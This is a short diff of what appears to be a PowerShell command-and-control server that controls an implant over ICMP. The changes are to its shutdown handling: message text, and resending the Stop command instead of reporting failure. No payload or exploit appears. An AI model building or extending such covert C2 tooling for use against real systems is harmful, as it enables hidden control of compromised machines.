@@ -194,7 +194,7 @@ public static class LIBC
 					NeedsInstruction {
 						If ($CommandToSend -ieq "quit" -or $CommandToSend -ieq "exit" -or $CommandToSend -ieq "stop") {
 							Send-ICMPMessage -ICMPHeader $ICMPHeader -Endpoint $Endpoint -MessageType Stop;
-							Write-Host "Gracefully shutting down implant...";
+							Write-Host "Gracefully shutting down implant" -NoNewline;
 							$State = [ServerState]::Stopping;
 						}
 						Else {
@@ -234,12 +234,12 @@ public static class LIBC
 				If ($null -eq $ICMPHeader) { Continue; }
 				Switch ($MessageType) {
 					Stopping {
-						Write-Host "Bye!";
+						Write-Host "`nBye!";
 						Return;
 					}
 					Default {
-						Write-Host "Failed to shut down implant.";
-						$State = [ServerState]::WaitingForPrompt;
+						Send-ICMPMessage -ICMPHeader $ICMPHeader -Endpoint $Endpoint -MessageType Stop;
+						Write-Host "." -NoNewline;
 					}
 				}
 			}
